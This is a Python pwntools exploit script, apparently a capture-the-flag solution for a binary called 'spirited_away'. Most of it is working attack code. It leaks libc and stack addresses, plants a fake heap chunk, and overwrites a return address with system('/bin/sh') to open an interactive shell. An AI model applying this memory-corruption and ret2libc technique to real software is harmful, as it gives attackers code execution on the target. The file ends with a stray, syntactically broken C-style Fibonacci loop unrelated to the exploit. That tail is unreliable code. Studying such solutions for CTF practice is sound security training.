from pickle import TRUE
from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './spirited_away_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = ELF('libc_32.so.6', checksec=False)
pre_cmt = False
def comment(pre_cmt,name,age,reason,comment):
    if pre_cmt:
        p.sendafter(b'<y/n>: ',b'y')
    if name != False:
        p.sendafter(b'name: ',name)
    p.sendlineafter(b'age: ',age)
    p.sendafter(b'movie? ',reason)
    if comment:
        p.sendafter(b'comment: ',comment)


for i in range(0,101):
    if i == 0:
        pre_cmt = False
    else:
        pre_cmt = True
    if i > 9 and i <= 99:
        comment(pre_cmt,False,b'1',b'1',False)
    elif i > 99:
        comment(pre_cmt,b'a',b'1',b'c',b'd')
    else:
        comment(pre_cmt,b'a',b'1',b'c',b'd')


comment(TRUE,b'a',b'1',b'l'*4*6,b'd'*80)

p.recvuntil(b'l'*4*6)
leak = u32(p.recv(4))
libc.address = leak - 0x675e7
comment(TRUE,b'a',b'1',b'c'*4*14,b'd'*80)
p.recvuntil(b'c'*4*14)
stack = u32(p.recv(4))
log.info('libc address: ' + hex(libc.address))
log.info('stack address: ' + hex(stack))
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
exit = libc.symbols['exit']

comment(TRUE,b'a',b'1', p32(0) + p32(0x40) + b'aaaa'*15 + p32(0x1009),b'd'*84 + p32(stack-0x68))
payload = b'a' * 76
payload += p32(system)
payload += p32(exit)
payload += p32(binsh)

comment(TRUE,payload,b'1',b'c',b'a')
p.interactive()
#0x6e
#0x50
#0x6e

d1 = 0
d2 = 1
for (i, i < n; i++){
    d3 = d1 + d2
    print(d3)
    d1 = d2
    d2 = d3
}






























